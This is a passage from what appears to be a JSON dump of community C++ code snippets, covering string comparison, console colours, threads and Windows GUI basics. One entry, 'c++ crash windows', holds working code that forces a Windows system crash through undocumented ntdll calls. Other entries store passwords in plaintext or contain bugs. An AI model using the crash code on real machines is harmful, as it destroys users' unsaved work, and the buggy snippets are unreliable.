    "description": " // syntax #include <cstring> // this needs to be at the top of the script/code std::strcmp(<1st-char>,<2nd-char>)    // example (assuming: char_1 = 'Compare me'; char_2 = 'Compare_me') #include <cstring> if (std::strcmp(char_1,char_2) == 0) {  std::cout << \"The char's that you compared match!\" << std::endl;  } else {  std::cout << \"The char's that you compared DON'T match\" << std::endl;  }  // OUTPUT: The char's that you compared match!  /* NOTE: the following outputs of std::strcmp indicate: [less than zero] : left-hand-side appears before right-hand-side in lexicographical order [zero] : the chars are equal [greater than zero] : left-hand-side appears after right-hand-side in lexicographical order */\n#include <string.h>  if( !strcmp( charTime, buf )) \n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 791,
    "keyword": null,
    "link": null,
    "title": " c++ compare contents of two arrays",
    "description": "std::array<int, 5> iar1 {1,2,3,4,5}; std::array<int, 5> iar2 {1,2,3,4,5};  if( iar1 == iar2 ) {   // arrays contents are the same  } else {   // not the same  } \n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 792,
    "keyword": null,
    "link": null,
    "title": " c++ compare strings ignore case",
    "description": "#include <boost/algorithm/string.hpp> // Or, for fewer header dependencies: //#include <boost/algorithm/string/predicate.hpp>  std::string str1 = \"hello, world!\"; std::string str2 = \"HELLO, WORLD!\";  if (boost::iequals(str1, str2)) {     // Strings are identical } \n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 793,
    "keyword": null,
    "link": null,
    "title": " c++ compare time",
    "description": "#include <chrono>  using namespace std::chrono;   auto start = high_resolution_clock::now();  auto stop = high_resolution_clock::now();  auto duration = duration_cast<microseconds>(stop - start);     cout << duration.count() << endl; \n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 794,
    "keyword": null,
    "link": null,
    "title": " c++ compile to exe",
    "description": "gcc sourcefile_name.c -o outputfile.exe\n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 795,
    "keyword": null,
    "link": null,
    "title": " c++ compile to exe command line",
    "description": "gcc sourcefile_name.c -o outputfile.exe\n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 796,
    "keyword": null,
    "link": null,
    "title": " c++ compile to msi",
    "description": "->> msiexec.exe // https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/msiexec\nint main() {     int a1[5]={1,2,3,4,5};     int a2[3];     int i=0;     int n=3;     for(;i<n;i++)     {         a2[i]=a1[i];     } }\n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 797,
    "keyword": null,
    "link": null,
    "title": " c++ console color",
    "description": "WORD color = 0x0F; // White SetConsoleTextAttribute( GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED); cout << \"Hello World\" << endl; SetConsoleTextAttribute( GetStdHandle(STD_OUTPUT_HANDLE), color); // The farbcodes are the same as they, when you type \"color help\" in the windows  // cmd in. First the number, then the letter (here the output of the cmd): /*  0 = Black       8 = Gray     1 = Blue        9 = Light Blue     2 = Green       A = Light Green     3 = Aqua        B = Light Aqua     4 = Red         C = Light Red     5 = Purple      D = Light Purple     6 = Yellow      E = Light Yellow     7 = Light Gray  F = White     */ // So, to get the output white again, you have the set the color to: // 0x + 0 (Black Background) + F (White Foreground) // This works on every OS!\nSetConsoleTextAttribute(console, ((int)background * 16) + (int)forground);\n//This is a header file taken from cplusplus.com //http://www.cplusplus.com/articles/Eyhv0pDG/ //concol.h #ifndef _INC_EKU_IO_CONCOL #define _INC_EKU_IO_CONCOL  /*Header file to color text and background in windows console applications Global variables - textcol,backcol,deftextcol,defbackcol,colorprotect*/  #include<windows.h> #include<iosfwd>  namespace eku {  #ifndef CONCOL #define CONCOL \tenum concol \t{ \t\tblack=0, \t\tdark_blue=1, \t\tdark_green=2, \t\tdark_aqua,dark_cyan=3, \t\tdark_red=4, \t\tdark_purple=5,dark_pink=5,dark_magenta=5, \t\tdark_yellow=6, \t\tdark_white=7, \t\tgray=8, \t\tblue=9, \t\tgreen=10, \t\taqua=11,cyan=11, \t\tred=12, \t\tpurple=13,pink=13,magenta=13, \t\tyellow=14, \t\twhite=15 \t}; #endif //CONCOL  \tHANDLE std_con_out; \t//Standard Output Handle \tbool colorprotect=false; \t//If colorprotect is true, background and text colors will never be the same \tconcol textcol,backcol,deftextcol,defbackcol; \t/*textcol - current text color \tbackcol - current back color \tdeftextcol - original text color \tdefbackcol - original back color*/  \tinline void update_colors() \t{ \t\tCONSOLE_SCREEN_BUFFER_INFO csbi; \t\tGetConsoleScreenBufferInfo(std_con_out,&csbi); \t\ttextcol = concol(csbi.wAttributes & 15); \t\tbackcol = concol((csbi.wAttributes & 0xf0)>>4); \t}  \tinline void setcolor(concol textcolor,concol backcolor) \t{ \t\tif(colorprotect && textcolor==backcolor)return; \t\ttextcol=textcolor;backcol=backcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void settextcolor(concol textcolor) \t{ \t\tif(colorprotect && textcolor==backcol)return; \t\ttextcol=textcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void setbackcolor(concol backcolor) \t{ \t\tif(colorprotect && textcol==backcolor)return; \t\tbackcol=backcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void concolinit() \t{ \t\tstd_con_out=GetStdHandle(STD_OUTPUT_HANDLE); \t\tupdate_colors(); \t\tdeftextcol=textcol;defbackcol=backcol; \t}  \ttemplate<class elem,class traits> \tinline std::basic_ostream<elem,traits>& operator<<(std::basic_ostream<elem,traits>& os,concol col) \t{os.flush();settextcolor(col);return os;}  \ttemplate<class elem,class traits> \tinline std::basic_istream<elem,traits>& operator>>(std::basic_istream<elem,traits>& is,concol col) \t{ \t\tstd::basic_ostream<elem,traits>* p=is.tie(); \t\tif(p!=NULL)p->flush(); \t\tsettextcolor(col); \t\treturn is; \t} \t }\t//end of namespace eku  #endif\t//_INC_EKU_IO_CONCOL\n//This is one way to do it. Taken from stackoverflow. system(\"color 70\"); //It just runs a cmd command.\n",
    "reg_date": "2021-10-12T11:37:49.000Z"
  },
  {
    "id": 798,
    "keyword": null,
    "link": null,
    "title": " c++ console color some digits",
    "description": "#include \"colormod.h\" // namespace Color #include <iostream> using namespace std; int main() {     Color::Modifier red(Color::FG_RED);     Color::Modifier def(Color::FG_DEFAULT);     cout << \"This ->\" << red << \"word\" << def << \"<- is red.\" << endl; }  #include <ostream> namespace Color {     enum Code {         FG_RED      = 31,         FG_GREEN    = 32,         FG_BLUE     = 34,         FG_DEFAULT  = 39,         BG_RED      = 41,         BG_GREEN    = 42,         BG_BLUE     = 44,         BG_DEFAULT  = 49     };     class Modifier {         Code code;     public:         Modifier(Code pCode) : code(pCode) {}         friend std::ostream&         operator<<(std::ostream& os, const Modifier& mod) {             return os << \"\\033[\" << mod.code << \"m\";         }     }; }\n cout << \"\\033[1;31mbold red text\\033[0m\\n\";\n#include <ostream> namespace Color {     enum Code {         FG_RED      = 31,         FG_GREEN    = 32,         FG_BLUE     = 34,         FG_DEFAULT  = 39,         BG_RED      = 41,         BG_GREEN    = 42,         BG_BLUE     = 44,         BG_DEFAULT  = 49     };     class Modifier {         Code code;     public:         Modifier(Code pCode) : code(pCode) {}         friend std::ostream&         operator<<(std::ostream& os, const Modifier& mod) {             return os << \"\\033[\" << mod.code << \"m\";         }     }; }\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 799,
    "keyword": null,
    "link": null,
    "title": " c++ console cursor",
    "description": "#include <windows.h> int main() {    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);    COORD pos = {3, 6};    SetConsoleCursorPosition(hConsole, pos);    WriteConsole(hConsole, \"Hello\", 5, NULL, NULL);    return 0;}\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 800,
    "keyword": null,
    "link": null,
    "title": " c++ const shared ptr",
    "description": "#include <memory> std::shared_ptr<int> foo = std::make_shared<int> (10);\nshared_ptr<T> p;             ---> T * p;                                    : nothing is const const shared_ptr<T> p;       ---> T * const p;                              : p is const shared_ptr<const T> p;       ---> const T * p;       <=> T const * p;       : *p is const const shared_ptr<const T> p; ---> const T * const p; <=> T const * const p; : p and *p are const. \n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 801,
    "keyword": null,
    "link": null,
    "title": " c++ constant",
    "description": "#define LENGTH 10    #define WIDTH  5 #define NEWLINE '\\n'\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 802,
    "keyword": null,
    "link": null,
    "title": " c++ contains",
    "description": "if (string1.find(string2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\nif (s1.find(s2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 803,
    "keyword": null,
    "link": null,
    "title": " c++ convert binary string to decimal",
    "description": "string bin_string = \"10101010\"; int number =0; number = stoi(bin_string, 0, 2); // number = 170\n// if the error terminate called after throwing an instance of  // 'std::out_of_range' what():  stoi // is being thrown by stoi use stol string bin_string = \"0101010101010101010101010101010101010101010101010101\"; long number = 0; number = stol(bin_string,0,2); // number = 1501199875790165\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 804,
    "keyword": null,
    "link": null,
    "title": " c++ convert const char* to LPCWSTR",
    "description": "  const char *p = \"D:\\\\\";   const WCHAR *pwcsName; //LPCWSTR      // required size   int size = MultiByteToWideChar(CP_ACP, 0, p, -1, NULL, 0);   // allocate it   pwcsName = new WCHAR[nChars];   MultiByteToWideChar(CP_ACP, 0, p, -1, (LPWSTR)pwcsName, size);   // use it....        // delete it   delete [] pwcsName; }\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 805,
    "keyword": null,
    "link": null,
    "title": " c++ convert const char* to int",
    "description": "#include <iostream> #include <sstream>  const char* value = \"1234567\"; stringstream strValue; strValue << value;  unsigned int intValue; strValue >> intValue;  cout << value << endl; cout << intValue << endl;\n",
    "reg_date": "2021-10-12T11:37:50.000Z"
  },
  {
    "id": 806,
    "keyword": null,
    "link": null,
    "title": " c++ convert int to cstring",
    "description": "#include<isotream> #include<string> using namespace std;  string str = to_string(int); char cstr[size] = \"\"; strcat_s( cstr, str.c_str());\n#include<isotream> #include<string>  string str = to_string(int); char cstr[size] = \"\"; strcat_s( cstr, str.c_str());\n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 807,
    "keyword": null,
    "link": null,
    "title": " c++ convert int to double",
    "description": "int a{5},b{2},c{9}; double d = (double)a / (double)b + (double)c;\ndouble x; x = (double) 25;\ndouble d = (double)a / (double)b + (double)c; \n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 808,
    "keyword": null,
    "link": null,
    "title": " c++ convert lowercase to uppercase",
    "description": "for(int i=0;i<str.size();i++){ int c = str[i];          if (islower(c))               str[i] = toupper(c); }\ntransform(str.begin(), str.end(), str.begin(), ::toupper); \n#include<bits/stdc++.h>  using namespace std;     int main()  {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::toupper);  //uppercase     cout << s << endl;      return 0;  } \n/* toupper example */ #include <stdio.h> #include <ctype.h> int main () {   int i=0;   char str[]=\"Test String.\\n\";   char c;   while (str[i])   {     c=str[i];     putchar (toupper(c));     i++;   }   return 0; }\nint i = 0;     while(str[i])     {         if(str[i] == std::toupper(str[i]) && std::isalpha(str[i]) == 1024)         str[i]+= 32;         ++i;     }\n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 809,
    "keyword": null,
    "link": null,
    "title": " c++ convert template function to normal function",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <string> #include <iostream>  using namespace std;  template<typename T> void removeSubstrs(basic_string<T>& s,                    const basic_string<T>& p) {    basic_string<T>::size_type n = p.length();     for (basic_string<T>::size_type i = s.find(p);         i != basic_string<T>::npos;         i = s.find(p))       s.erase(i, n); }  int main() {    string s = \"One fish, two fish, red fish, blue fish\";    string p = \"fish\";     removeSubstrs(s, p);     cout << s << '\\n'; } The basic_string member func\n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 810,
    "keyword": null,
    "link": null,
    "title": " c++ convert to assembly language",
    "description": "$ gcc -S geeks.c \n   #include<iostream> #include<fstream> using namespace std;   struct mail {     char un[50];             // user name     char pd[50];             // passsword     void reg(int); } obj[5];   void mail::reg(int k) {     int i=k;     cout<<\"\\nEnter user name :: \";     cin>>un;     cout<<\"\\nEnter password :: \";     cin>>pd;       ofstream filout;     filout.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::app|ios::binary);     if(!filout)     {         cout<<\"\\nCannot open file\\n\";     }     else     {         cout<<\"\\n\";         filout.write((char *)&obj[i],sizeof(mail));         filout.close();     }       cout<<\"\\n...........You are now registered.......... \\n\\n\";   }   // end of sign up or register func   int main() {     int t;     cout<<\"\\nEnter Registration Details for User 1 :: \\n\";     obj[0].reg(0);     cout<<\"\\nEnter Registration Details for User 2 :: \\n\";     obj[1].reg(1);     cout<<\"\\nEnter Registration Details for User 3 :: \\n\";     obj[2].reg(2);       mail obj2;       ifstream filein;     filein.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::in|ios::binary);     if(!filein)     {         cout<<\"\\nUnable to open file to read\\n\";     }     else     {         cout<<\"\\nRegistered Details of All Users :: \\n\";         filein.read((char *)&obj2,sizeof(obj2));         while(filein)         {             cout<<\"\\nUsername :: \"<<obj2.un<<\"\\nPasswword :: \"<<obj2.pd<<\"\\n\";             filein.read((char *)&obj2,sizeof(obj2));         }             //filein.close();     }         return 0; } \n  #include<iostream> #include<fstream> using namespace std;   struct mail {     char un[50];             // user name     char pd[50];             // passsword     void reg(int); } obj[5];   void mail::reg(int k) {     int i=k;     cout<<\"\\nEnter user name :: \";     cin>>un;     cout<<\"\\nEnter password :: \";     cin>>pd;       ofstream filout;     filout.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::app|ios::binary);     if(!filout)     {         cout<<\"\\nCannot open file\\n\";     }     else     {         cout<<\"\\n\";         filout.write((char *)&obj[i],sizeof(mail));         filout.close();     }       cout<<\"\\n...........You are now registered.......... \\n\\n\";   }   // end of sign up or register func   int main() {     int t;     cout<<\"\\nEnter Registration Details for User 1 :: \\n\";     obj[0].reg(0);     cout<<\"\\nEnter Registration Details for User 2 :: \\n\";     obj[1].reg(1);     cout<<\"\\nEnter Registration Details for User 3 :: \\n\";     obj[2].reg(2);       mail obj2;       ifstream filein;     filein.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::in|ios::binary);     if(!filein)     {         cout<<\"\\nUnable to open file to read\\n\";     }     else     {         cout<<\"\\nRegistered Details of All Users :: \\n\";         filein.read((char *)&obj2,sizeof(obj2));         while(filein)         {             cout<<\"\\nUsername :: \"<<obj2.un<<\"\\nPasswword :: \"<<obj2.pd<<\"\\n\";             filein.read((char *)&obj2,sizeof(obj2));         }             //filein.close();     }         return 0; } }  \nint main(){   printf(\"Hello World\");  return 0;  }\n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 811,
    "keyword": null,
    "link": null,
    "title": " c++ convert to c online",
    "description": "#include <bits/stdc++.h> #define int long long using namespace std; const int maxn=1e9+5; int t,n,x; signed main(){     cin >> t;     while (t--){         cin>>n;         int sum=0;         for(int i=0;i<n;++i){             cin>>x;             sum+=x;         }         if(sum<n) cout<<1<<'\\n';         if(sum==n) cout<<0<<'\\n';         if(sum>n) cout<<sum-n<<'\\n';     }  }\nconvert to c\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 812,
    "keyword": null,
    "link": null,
    "title": " c++ copy constructor",
    "description": "// Copy constructor      Point(const Point &p2) {x = p2.x; y = p2.y; }         int getX()            {  return x; }      int getY()            {  return y; }  }; \n/*  * The copy constructor in C++ is used to construct one object based on another.  * Specifically, a 'deep' copy is made, such that any heap-allocated memory  * is copied fresh. Thus, the copied-to object doesn't rely on the copied-from  * object after the constructor is called.  *  * The copy constructor is called as follows:  *   *  Array a;   *  // ... put data in a ...  *  Array b(a);   *  * See below for implementation details.   */  /*  * Function:   Example copy constructor for an Array class.  * Parameters: An Array to make a deep copy of  * Effects:    This is now a deep copy of other  * Notes:      It's often convenient to use a 'copy' function, as this is also done in the =operator overload.  */ Array::Array(const Array& other) {     copy(other);         // make a deep copy of all memory in 'other' to 'this' }  /*  * Function:   copy  * Parameters: An array to make a deep copy of  * Returns:    None  * Effects:    Makes a deep copy of other into this.   */ void Array::copy(const Array& other) { \tfor (int = 0; i < other.len; i++) {      \tthis->data[i] = other.data[i];      }   \tthis->len = other.len; }   \n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 813,
    "keyword": null,
    "link": null,
    "title": " c++ cout colored output xcode",
    "description": "//the following are UBUNTU/LINUX, and MacOS ONLY terminal color codes. #define RESET   \"\\033[0m\" #define BLACK   \"\\033[30m\"      /* Black */ #define RED     \"\\033[31m\"      /* Red */ #define GREEN   \"\\033[32m\"      /* Green */ #define YELLOW  \"\\033[33m\"      /* Yellow */ #define BLUE    \"\\033[34m\"      /* Blue */ #define MAGENTA \"\\033[35m\"      /* Magenta */ #define CYAN    \"\\033[36m\"      /* Cyan */ #define WHITE   \"\\033[37m\"      /* White */ #define BOLDBLACK   \"\\033[1m\\033[30m\"      /* Bold Black */ #define BOLDRED     \"\\033[1m\\033[31m\"      /* Bold Red */ #define BOLDGREEN   \"\\033[1m\\033[32m\"      /* Bold Green */ #define BOLDYELLOW  \"\\033[1m\\033[33m\"      /* Bold Yellow */ #define BOLDBLUE    \"\\033[1m\\033[34m\"      /* Bold Blue */ #define BOLDMAGENTA \"\\033[1m\\033[35m\"      /* Bold Magenta */ #define BOLDCYAN    \"\\033[1m\\033[36m\"      /* Bold Cyan */ #define BOLDWHITE   \"\\033[1m\\033[37m\"      /* Bold White */ \n",
    "reg_date": "2021-10-12T11:37:51.000Z"
  },
  {
    "id": 814,
    "keyword": null,
    "link": null,
    "title": " c++ cout format",
    "description": "#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\nCout<<\"Hello\"<<endl;\nint age; cin >> age;\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 815,
    "keyword": null,
    "link": null,
    "title": " c++ cout format specifier for correct number of decimal points",
    "description": "#include <iostream> #include <iomanip>  int main() {     double d = 122.345;      std::cout << std::fixed;     std::cout << std::setprecision(2);     std::cout << d; } \n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 816,
    "keyword": null,
    "link": null,
    "title": " c++ cout int",
    "description": "  int i;   cout << \"Please enter an integer value: \";   cin >> i;\n#include <iostream>  std::cout << \"Hello, World!\" << std::endl;\n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 817,
    "keyword": null,
    "link": null,
    "title": " c++ cout tab space",
    "description": " cout<<\"Hello \\t World\"<<endl; \n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 818,
    "keyword": null,
    "link": null,
    "title": " c++ crash windows",
    "description": "#include <Windows.h> #include <ntstatus.h>  #define SHUTDOWN_PRIVILEGE 19 #define OPTION_SHUTDOWN 6  // function definitions typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege) ( \tULONG privilege, \tBOOLEAN enable, \tBOOLEAN current_thread, \tPBOOLEAN enabled); typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)( \tNTSTATUS error_status, \tULONG number_of_parameters, \tULONG unicode_string_parameter_mask, \tPULONG_PTR parameters, \tULONG response_option, \tPULONG reponse);  int main() { \tpdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA(\"ntdll.dll\"), \"RtlAdjustPrivilege\"); \tBOOLEAN enabled; \tif (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0) \t{ \t\tpdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA(\"ntdll.dll\"), \"NtRaiseHardError\"); \t\tULONG response; \t\tNtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &response); \t} }\n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 819,
    "keyword": null,
    "link": null,
    "title": " c++ create a vecto",
    "description": "stack \n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 820,
    "keyword": null,
    "link": null,
    "title": " c++ create button",
    "description": "HWND hwndButton = CreateWindow(      L\"BUTTON\",  // Predefined class; Unicode assumed      L\"OK\",      // Button text      WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles      10,         // x position      10,         // y position      100,        // Button width     100,        // Button height     m_hwnd,     // Parent window     NULL,       // No menu.     (HINSTANCE)GetWindowLongPtr(m_hwnd, GWLP_HINSTANCE),      NULL);      // Pointer not needed. \n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 821,
    "keyword": null,
    "link": null,
    "title": " c++ create pair",
    "description": "make_pair(a,b)\n",
    "reg_date": "2021-10-12T11:37:52.000Z"
  },
  {
    "id": 822,
    "keyword": null,
    "link": null,
    "title": " c++ create thread",
    "description": "#include <thread> void foo()  {   // do stuff... } int main()  {   std::thread first (foo);   first.join(); }\nvoid task1(std::string msg) {     std::cout << \"task1 says: \" << msg; }  std::thread t1(task1, \"Hello\");  t1.join(); \n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 823,
    "keyword": null,
    "link": null,
    "title": " c++ create threads",
    "description": "#include <thread> void foo()  {   // do stuff... } int main()  {   std::thread first (foo);   first.join(); }\n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 824,
    "keyword": null,
    "link": null,
    "title": " c++ create vector of size",
    "description": "vector<vector<int>> v(10, vector<int>(10));\n#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\n#include <iostream> #include <vector>  using namespace std;  int main(void) {    vector<int> v;     cout << \"Initial vector size = \" << v.size() << endl;     v.resize(5, 10);    cout << \"Vector size after resize = \" << v.size() << endl;     cout << \"Vector contains following elements\" << endl;    for (int i = 0; i < v.size(); ++i)       cout << v[i] << endl;     return 0; }\n// create a vector with 20 integer elements std::vector<int> arr(20);  for(int x = 0; x < 20; ++x)    arr[x] = x;\n#include <vector>  auto n = 20 // create a vector with n=20 integer elements std::vector<int> arr(n);\nvector<Entry> array(1000);//size of 1000 \n",
    "reg_date": "2021-10-12T11:37:53.000Z"
  },
  {
    "id": 825,
    "keyword": null,
    "link": null,
    "title": " c++ create window",
    "description": "// HelloWindowsDesktop.cpp // compile with: /D_UNICODE /DUNICODE /DWIN32 /D_WINDOWS /c  #include <windows.h> #include <stdlib.h> #include <string.h> #include <tchar.h>  // Global variables  // The main window class name. static TCHAR szWindowClass[] = _T(\"DesktopApp\");  // The string that appears in the application's title bar. static TCHAR szTitle[] = _T(\"Windows Desktop Guided Tour Application\");  HINSTANCE hInst;  // Forward declarations of functions included in this code module: LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);  int CALLBACK WinMain(    _In_ HINSTANCE hInstance,    _In_opt_ HINSTANCE hPrevInstance,    _In_ LPSTR     lpCmdLine,    _In_ int       nCmdShow ) {    WNDCLASSEX wcex;     wcex.cbSize = sizeof(WNDCLASSEX);    wcex.style          = CS_HREDRAW | CS_VREDRAW;    wcex.lpfnWndProc    = WndProc;    wcex.cbClsExtra     = 0;    wcex.cbWndExtra     = 0;    wcex.hInstance      = hInstance;    wcex.hIcon          = LoadIcon(hInstance, IDI_APPLICATION);    wcex.hCursor        = LoadCursor(NULL, IDC_ARROW);    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);    wcex.lpszMenuName   = NULL;    wcex.lpszClassName  = szWindowClass;    wcex.hIconSm        = LoadIcon(wcex.hInstance, IDI_APPLICATION);     if (!RegisterClassEx(&wcex))    {       MessageBox(NULL,          _T(\"Call to RegisterClassEx failed!\"),          _T(\"Windows Desktop Guided Tour\"),          NULL);        return 1;    }     // Store instance handle in our global variable    hInst = hInstance;     // The parameters to CreateWindow explained:    // szWindowClass: the name of the application    // szTitle: the text that appears in the title bar    // WS_OVERLAPPEDWINDOW: the type of window to create    // CW_USEDEFAULT, CW_USEDEFAULT: initial position (x, y)    // 500, 100: initial size (width, length)    // NULL: the parent of this window    // NULL: this application does not have a menu bar    // hInstance: the first parameter from WinMain    // NULL: not used in this application    HWND hWnd = CreateWindow(       szWindowClass,       szTitle,       WS_OVERLAPPEDWINDOW,       CW_USEDEFAULT, CW_USEDEFAULT,       500, 100,       NULL,       NULL,       hInstance,       NULL    );     if (!hWnd)    {       MessageBox(NULL,          _T(\"Call to CreateWindow failed!\"),          _T(\"Windows Desktop Guided Tour\"),          NULL);        return 1;    }     // The parameters to ShowWindow explained:    // hWnd: the value returned from CreateWindow    // nCmdShow: the fourth parameter from WinMain    ShowWindow(hWnd,       nCmdShow);    UpdateWindow(hWnd);     // Main message loop:    MSG msg;    while (GetMessage(&msg, NULL, 0, 0))    {       TranslateMessage(&msg);       DispatchMessage(&msg);    }     return (int) msg.wParam; }  //  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM) // //  PURPOSE:  Processes messages for the main window. // //  WM_PAINT    - Paint the main window //  WM_DESTROY  - post a quit message and return LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {    PAINTSTRUCT ps;    HDC hdc;    TCHAR greeting[] = _T(\"Hello, Windows desktop!\");     switch (message)    {    case WM_PAINT:       hdc = BeginPaint(hWnd, &ps);        // Here your application is 